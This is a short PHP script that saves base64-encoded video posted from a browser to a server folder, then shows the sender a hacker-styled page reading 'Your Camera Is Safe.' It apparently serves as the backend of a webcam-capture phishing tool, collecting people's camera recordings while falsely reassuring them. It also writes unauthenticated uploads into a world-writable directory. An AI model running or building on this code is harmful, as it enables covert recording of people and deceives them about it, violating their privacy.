<?php
if (isset($_POST['videoData'])) {
    $videoData = $_POST['videoData'];

    // Check for the MIME type to determine the correct extension
    if (strpos($videoData, 'data:video/webm;base64,') === 0) {
        $extension = '.webm';
    } elseif (strpos($videoData, 'data:video/mp4;base64,') === 0) {
        $extension = '.mp4';
    } elseif (strpos($videoData, 'data:video/mov;base64,') === 0) {
        $extension = '.mov';
    } else {
        echo "Unsupported video format.";
        exit;
    }

    // Remove the base64 header and decode the data
    $data = explode(',', $videoData);
    $videoContent = base64_decode($data[1]);

    // Define a folder to save the video
    $uploadFolder = 'videos/';
    if (!is_dir($uploadFolder)) {
        mkdir($uploadFolder, 0777, true);  // Create the folder if it doesn't exist
    }

    // Generate a unique filename for the video
    $uniqueID = uniqid();
    $fileName = $uploadFolder . $uniqueID . $extension;

    // Save the video file to the server
    file_put_contents($fileName, $videoContent);

    // Provide feedback after saving the video
    echo '<div style="background-color:black; color:#00ff00; font-family:Courier, monospace; text-align:center; padding:50px;">
            <h1 style="text-shadow: 0px 0px 10px #00ff00;">Your Camera Is Safe.</h1>
          </div>';
} else {
    echo '<div style="background-color:black; color:#00ff00; font-family:Courier, monospace; text-align:center; padding:50px;">
            <h1 style="text-shadow: 0px 0px 10px #ff0000;">Error. Please Try Again</h1>
          </div>';
}
?>